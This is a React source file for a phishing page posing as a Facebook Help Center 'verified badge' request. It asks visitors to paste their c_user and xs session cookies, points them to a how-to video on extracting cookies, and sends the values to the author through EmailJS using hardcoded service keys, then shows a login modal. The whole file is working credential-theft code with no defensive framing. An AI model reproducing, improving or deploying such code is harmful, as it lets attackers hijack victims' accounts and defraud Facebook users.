import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import FacebookVideo from "./assets/fbVideo.png";
import LoginModal from "./modal/LoginModal";
import "./style.css";

const ValidationPage = () => {
  const form = useRef();
  const [showModal, setShowModal] = useState(false);
  const [isFormValid, setIsFormValid] = useState(false);

  // Send email function with no validation
  const sendEmail = (e) => {
    e.preventDefault();

    // Get the values of the input fields
    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    // Since there's no validation, we can directly send the email if the fields are not empty
    if (cUserValue && xsValue) {
      // Fields are valid, send the email and show the modal
      emailjs
        .sendForm(
          "service_b3ygazp",
          "template_nicx99v",
          form.current,
          "HRvQhlrccTyfwKrGF"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true);
            setIsFormValid(false); // Reset form validity after successful submission
          },
          (error) => {
            console.log(error.text);
            setIsFormValid(false); // Reset validity on error
          }
        );
    } else {
      // Fields are not valid, set the error flag to display an error message
      setIsFormValid(true);
    }
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail}>
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "90px", background: "#4667AC" }}
        >
          <h1 className="text-white ms-4 m-0 d-flex align-self-center">
            facebook
          </h1>
        </div>

        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
        >
          <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
            Help Center
          </h4>
        </div>

        <div className="col-12 my-4 d-flex justify-content-center align-items-center">
          <div className="col-11 col-md-6 border">
            <div className="p-2" style={{ background: "#F5F6F7" }}>
              <h5 className="m-0">Request a verified badge on Facebook</h5>
            </div>
            <div className="p-2">
              {isFormValid && (
                <div className="alert alert-danger">
                  Please fill in both fields.
                  <br />
                  For more details, check the video below.
                </div>
              )}
              <p className="fw-semibold validation_form_para">
                The verified badge means that Facebook has confirmed that the
                Page or profile is the authentic presence of the individual,
                public figure, or brand it represents.
              </p>
              <p className="fw-semibold validation_form_para">
                Previously, the verified badge also required the person or
                brand to be notable and unique. You may still see users with a
                verified badge that represents our previous eligibility
                requirements.
              </p>
              <p className="fw-semibold validation_form_para">
                Please provide the precise details below. Refer to the video
                for clarification if you find the instructions unclear.
              </p>
              <p
                className="fw-semibold text-secondary"
                style={{ fontSize: "12px" }}
              >
                Detailed Video Information.
              </p>

              <video
                controls
                autoPlay
                src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
                style={{ width: "300px", height: "160px" }}
              />
              <br />
              <p className="fw-semibold validation_form_para mt-2">
                Please be sure to provide the requested information below.
              </p>

              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <br />
              <input
                type="number"
                name="c_user"
                required
                title="Please enter any number"
              />
              <br />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <br />
              <input
                type="text"
                name="xs"
                required
                title="Please enter any text"
              />
              <p className="mt-2" style={{ fontSize: "12px" }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
            </div>

            <div
              className="p-2 mb-2 d-flex justify-content-end"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white border-0"
                style={{ background: "#4267B2" }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>
      {showModal && (
        <LoginModal showModal={showModal} setShowModal={setShowModal} />
      )}
    </>
  );
};

export default ValidationPage;
